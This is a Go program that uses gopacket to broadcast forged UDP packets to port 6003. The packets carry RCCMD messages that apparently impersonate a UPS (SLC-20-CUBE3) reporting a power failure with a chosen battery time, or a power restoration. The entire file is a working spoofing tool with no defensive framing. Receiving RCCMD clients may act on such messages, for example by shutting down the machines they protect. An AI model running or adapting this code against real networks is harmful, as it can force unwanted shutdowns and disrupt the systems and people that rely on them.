package main

import (
	"flag"
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func BuildPacket(network *NetworkData, message string) ([]byte, error) {
	eth := layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       network.Mac,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
	}

	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    network.IP,
		DstIP:    network.Broadcast,
		Protocol: layers.IPProtocolUDP,
	}

	udp := layers.UDP{
		SrcPort: 34567,
		DstPort: 6003,
	}
	udp.SetNetworkLayerForChecksum(&ip)

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	buffer := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buffer, options,
		&eth,
		&ip,
		&udp,
		gopacket.Payload(message),
	); err != nil {
		fmt.Printf("[-] Serialize error: %s\n", err.Error())
		return []byte{}, err
	}
	outgoingPacket := buffer.Bytes()
	return outgoingPacket, nil
}

func main() {
	battery := flag.Int("battery", 0, "Battery time")
	restored := flag.Bool("restored", false, "Power restored event")
	failure := flag.Bool("failure", false, "Power failure event")
	flag.Parse()

	if (!*restored) && (!*failure) {
		fmt.Println("Check command help. One option must be selected")
		return
	}

	var message string
	if *failure {
		message = fmt.Sprintf("CONNECT TO RCCMD (SEND) MSG_EXECUTE MSG_TEXT Powerfail on SLC-20-CUBE3 (5): Autonomietime %v.00 min.", *battery)
	}
	if *restored {
		message = "CONNECT TO RCCMD (SEND) MSG_EXECUTE MSG_TEXT Powerfail on SLC-20-CUBE3 (5): restored."
	}

	network, err := GetNetworkData()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(network)

	handle, err := pcap.OpenLive(network.Name, 1500, false, pcap.BlockForever)
	if err != nil {
		fmt.Printf("%s\n", err.Error())
		return
	}

	outgoingPacket, err := BuildPacket(&network, message)
	if err != nil {
		fmt.Printf("%s\n", err.Error())
		return
	}

	if err = handle.WritePacketData(outgoingPacket); err != nil {
		fmt.Printf("[-] Error while sending: %s\n", err.Error())
		return
	}
}
